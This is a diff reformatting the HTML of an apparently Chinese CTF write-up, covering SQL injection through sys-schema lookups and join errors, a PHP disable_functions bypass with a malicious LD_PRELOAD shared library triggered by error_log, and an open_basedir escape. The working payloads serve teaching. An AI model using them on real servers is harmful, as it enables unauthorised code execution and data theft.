@@ -58,60 +58,97 @@
   </div>
 
   <!-- 文章目录 -->
-  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fake教务处"><span class="toc-text">fake教务处</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#主要考点"><span class="toc-text">主要考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#具体做法"><span class="toc-text">具体做法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#类似题目"><span class="toc-text">类似题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#张渗透的webshell"><span class="toc-text">张渗透的webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#disable-functions"><span class="toc-text">disable_functions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#open-basedir"><span class="toc-text">open_basedir</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关题目"><span class="toc-text">相关题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#张渗透的免杀webshell"><span class="toc-text">张渗透的免杀webshell</span></a></li></ol>
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">fake教务处</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#主要考点"><span class="toc-text">主要考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#具体做法"><span class="toc-text">具体做法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#类似题目"><span class="toc-text">类似题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">张渗透的webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#disable-functions"><span class="toc-text">disable_functions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#open-basedir"><span class="toc-text">open_basedir</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关题目"><span class="toc-text">相关题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">张渗透的免杀webshell</span></a></li></ol>
 
   <div class="post-content">
-    <h1 id="fake教务处"><a href="#fake教务处" class="headerlink" title="fake教务处"></a>fake教务处</h1><p>这题的登陆注册功能似乎误导了很多同学。。我的锅，开学可以来暴打我</p>
-<h2 id="主要考点"><a href="#主要考点" class="headerlink" title="主要考点"></a>主要考点</h2><ul>
+    <h1>fake教务处</h1>
+<p>这题的登陆注册功能似乎误导了很多同学。。我的锅，开学可以来暴打我</p>
+<h2 id="主要考点">主要考点</h2>
+<ul>
 <li>group by 代替order by(当然也可以直接union select)</li>
-<li>利用sys库bypass information_schema,获得表名<br>参见<a href="https://www.anquanke.com/post/id/193512#h2-3" target="_blank" rel="noopener">聊一聊bypass information_schema</a></li>
+<li>利用sys库bypass information_schema,获得表名<br>
+参见<a href="https://www.anquanke.com/post/id/193512#h2-3" target="_blank" rel="noopener">聊一聊bypass information_schema</a></li>
 <li>利用报错得到字段名,参见<a href="http://www.wupco.cn/?p=4117" target="_blank" rel="noopener">mysql注入可报错时爆表名、字段名、库名</a></li>
 </ul>
-<h2 id="具体做法"><a href="#具体做法" class="headerlink" title="具体做法"></a>具体做法</h2><ul>
-<li>随便注册个账号登陆进去,<code>?time=1&#39;</code>得到报错，发现注入点</li>
-<li>禁掉了一些报错函数，考虑使用union注入(其实禁的并不全，不过这里用union来做)</li>
-<li>发现or被过滤，无法使用order by，使用group by代替。<br><code>?time=1 group by 6</code>,<code>?time=1 group by 7</code>确定列数为6(当然也可以用<code>?time=1 union select 1,2,3,4,5,6,7</code>)</li>
-<li>or被过滤所以无法从information_schema中获得表名等信息，但可以从sys库中得到表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?time=-1 union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span></span><br></pre></td></tr></table></figure>
-得到表名users,grade,flag8ca6107</li>
-<li>sys库中无法获得列名，但可以利用join报错获得<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?time=-1 union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> flag8ca6107 <span class="keyword">as</span> a <span class="keyword">join</span> flag8ca6107 <span class="keyword">as</span> b) <span class="keyword">as</span> c),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span></span><br></pre></td></tr></table></figure>
-得到列名为flagcc6dfb</li>
-<li>最后拿到flag<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?time=-1 union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> flagcc6dfb <span class="keyword">from</span> flag8ca6107),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span></span><br></pre></td></tr></table></figure>
-<h2 id="类似题目"><a href="#类似题目" class="headerlink" title="类似题目"></a>类似题目</h2></li>
-<li><a href="https://buuoj.cn/challenges#[SWPU2019]Web1" target="_blank" rel="noopener">[SWPU2019]Web1</a></li>
-</ul>
-<h1 id="张渗透的webshell"><a href="#张渗透的webshell" class="headerlink" title="张渗透的webshell"></a>张渗透的webshell</h1><p>在phpinfo()中可以看到存在disable_functions和open_basedir。</p>
+<h2 id="具体做法">具体做法</h2>
 <ul>
-<li>disable_functions<br>在disable_functions范围内的函数不会被加载到PHP上下文中,因此无法使用这些函数<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link,map_open,imap_mail,ini_alter</span><br></pre></td></tr></table></figure></li>
-<li>open_basedir<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html:&#x2F;tmp</span><br></pre></td></tr></table></figure>
-限制了可访问的目录。</li>
+<li>随便注册个账号登陆进去,<code>?time=1'</code>得到报错，发现注入点</li>
+<li>禁掉了一些报错函数，考虑使用union注入(其实禁的并不全，不过这里用union来做)</li>
+<li>发现or被过滤，无法使用order by，使用group by代替。<br>
+<code>?time=1 group by 6</code>,<code>?time=1 group by 7</code>确定列数为6(当然也可以用<code>?time=1 union select 1,2,3,4,5,6,7</code>)</li>
+<li>or被过滤所以无法从information_schema中获得表名等信息，但可以从sys库中得到表名</li>
 </ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?time=-1 union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span></span><br></pre></td></tr></table></figure>
+<p>得到表名users,grade,flag8ca6107</p>
+<ul>
+<li>sys库中无法获得列名，但可以利用join报错获得</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?time=-1 union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> flag8ca6107 <span class="keyword">as</span> a <span class="keyword">join</span> flag8ca6107 <span class="keyword">as</span> b) <span class="keyword">as</span> c),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span></span><br></pre></td></tr></table></figure>
+<p>得到列名为flagcc6dfb</p>
+<ul>
+<li>最后拿到flag</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?time=-1 union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> flagcc6dfb <span class="keyword">from</span> flag8ca6107),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span></span><br></pre></td></tr></table></figure>
+<h2 id="类似题目">类似题目</h2>
+<ul>
+<li><a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb1" target="_blank" rel="noopener">[SWPU2019]Web1</a></li>
+</ul>
+<h1>张渗透的webshell</h1>
+<p>在phpinfo()中可以看到存在disable_functions和open_basedir。</p>
+<ul>
+<li>disable_functions<br>
+在disable_functions范围内的函数不会被加载到PHP上下文中,因此无法使用这些函数</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link,map_open,imap_mail,ini_alter</span><br></pre></td></tr></table></figure>
+<ul>
+<li>open_basedir</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html:&#x2F;tmp</span><br></pre></td></tr></table></figure>
+<p>限制了可访问的目录。</p>
 <p>命令执行的函数可以绕过open_basedir，因为它们本质上是调用了系统中的第三方程序，不受php的限制。但是上面的disable_functions把命令执行的函数都禁了(应该没漏吧。。)</p>
 <p>所以接下来要么绕过disable_functions执行系统命令，要么绕过open_basedir读文件</p>
-<h2 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h2><p>绕过disable_functions最常见的方法是通过LD_PRELOAD</p>
+<h2 id="disable-functions">disable_functions</h2>
+<p>绕过disable_functions最常见的方法是通过LD_PRELOAD</p>
 <p>LD_PRELOAD是linux的一个环境变量,用于指定加载的动态库。并且它指定的动态库加载优先级最高，详细参见<a href="https://www.anquanke.com/post/id/175403?from=singlemessage#h2-3" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a></p>
 <ul>
-<li>首先编译一个恶意so文件<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"cat /flag &gt; /tmp/flag"</span>);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-然后编译成动态链接库<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC fuck.c -o fuck</span><br><span class="line">gcc --share fuck -o fuck.so</span><br></pre></td></tr></table></figure></li>
-<li>获取恶意so文件内容的base64编码<br>so文件中有大量不可见字符，所以用base64编码一下<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> base64_encode(file_get_contents(<span class="string">'fuck.so'</span>));</span><br></pre></td></tr></table></figure></li>
-<li>将恶意so写入目标服务器<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zzy=file_put_contents(<span class="string">'/tmp/fuck.so'</span>,base64_decode(<span class="string">'xxxx'</span>));</span><br><span class="line"><span class="comment">//xxxx为刚刚得到的base64串，太长了我不贴了</span></span><br><span class="line">zzy=var_dump(scandir(<span class="string">'/tmp'</span>)); </span><br><span class="line"><span class="comment">//可以看到/tmp写入了fuck.so</span></span><br></pre></td></tr></table></figure></li>
-<li>接下来有两种方式触发LD_PRELOAD:<ul>
+<li>首先编译一个恶意so文件</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"cat /flag &gt; /tmp/flag"</span>);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后编译成动态链接库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC fuck.c -o fuck</span><br><span class="line">gcc --share fuck -o fuck.so</span><br></pre></td></tr></table></figure>
+<ul>
+<li>获取恶意so文件内容的base64编码<br>
+so文件中有大量不可见字符，所以用base64编码一下</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> base64_encode(file_get_contents(<span class="string">'fuck.so'</span>));</span><br></pre></td></tr></table></figure>
+<ul>
+<li>将恶意so写入目标服务器</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zzy=file_put_contents(<span class="string">'/tmp/fuck.so'</span>,base64_decode(<span class="string">'xxxx'</span>));</span><br><span class="line"><span class="comment">//xxxx为刚刚得到的base64串，太长了我不贴了</span></span><br><span class="line">zzy=var_dump(scandir(<span class="string">'/tmp'</span>)); </span><br><span class="line"><span class="comment">//可以看到/tmp写入了fuck.so</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>接下来有两种方式触发LD_PRELOAD:
+<ul>
 <li>mail()</li>
-<li>error_log()<br>两者都会调用linux中的sendmail，从而触发LD_PRELOAD执行恶意so文件</li>
+<li>error_log()<br>
+两者都会调用linux中的sendmail，从而触发LD_PRELOAD执行恶意so文件</li>
 </ul>
 </li>
 </ul>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(<span class="string">"LD_PRELOAD=/tmp/fuck.so"</span>);error_log(<span class="string">"test"</span>,<span class="number">1</span>,<span class="string">""</span>,<span class="string">""</span>);<span class="keyword">echo</span> file_get_contents(<span class="string">"/tmp/flag"</span>);</span><br></pre></td></tr></table></figure>
 <p>即可拿到flag</p>
-<h2 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzy=mkdir(<span class="string">'img'</span>);chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span> file_get_contents(<span class="string">'/flag'</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="open-basedir">open_basedir</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzy=mkdir(<span class="string">'img'</span>);chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span> file_get_contents(<span class="string">'/flag'</span>);</span><br></pre></td></tr></table></figure>
 <p>详细参见<a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">bypass open_basedir的新方法</a></p>
-<h2 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h2><p>一些和disable_functions和open_basedir相关的题目</p>
+<h2 id="相关题目">相关题目</h2>
+<p>一些和disable_functions和open_basedir相关的题目</p>
 <ul>
 <li><a href="https://buuoj.cn/challenges#Wallbreaker_Easy" target="_blank" rel="noopener">Wallbreaker_Easy</a></li>
-<li><a href="https://buuoj.cn/challenges#[ByteCTF%202019]BabyBlog" target="_blank" rel="noopener">[ByteCTF 2019]BabyBlog</a></li>
-<li><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]RCE%20ME" target="_blank" rel="noopener">[极客大挑战 2019]RCE ME</a></li>
-<li><a href="https://buuoj.cn/challenges#[SUCTF%202019]EasyWeb" target="_blank" rel="noopener">[SUCTF 2019]EasyWeb</a></li>
+<li><a href="https://buuoj.cn/challenges#%5BByteCTF%202019%5DBabyBlog" target="_blank" rel="noopener">[ByteCTF 2019]BabyBlog</a></li>
+<li><a href="https://buuoj.cn/challenges#%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME" target="_blank" rel="noopener">[极客大挑战 2019]RCE ME</a></li>
+<li><a href="https://buuoj.cn/challenges#%5BSUCTF%202019%5DEasyWeb" target="_blank" rel="noopener">[SUCTF 2019]EasyWeb</a></li>
 </ul>
-<h1 id="张渗透的免杀webshell"><a href="#张渗透的免杀webshell" class="headerlink" title="张渗透的免杀webshell"></a>张渗透的免杀webshell</h1><p>这真的是个白送的福利题啊。。没想到居然没人做出来</p>
+<h1>张渗透的免杀webshell</h1>
+<p>这真的是个白送的福利题啊。。没想到居然没人做出来</p>
 <p>主要有两个点</p>
 <ul>
 <li><a href="https://paper.seebug.org/94/" target="_blank" rel="noopener">create_function代码注入</a></li>
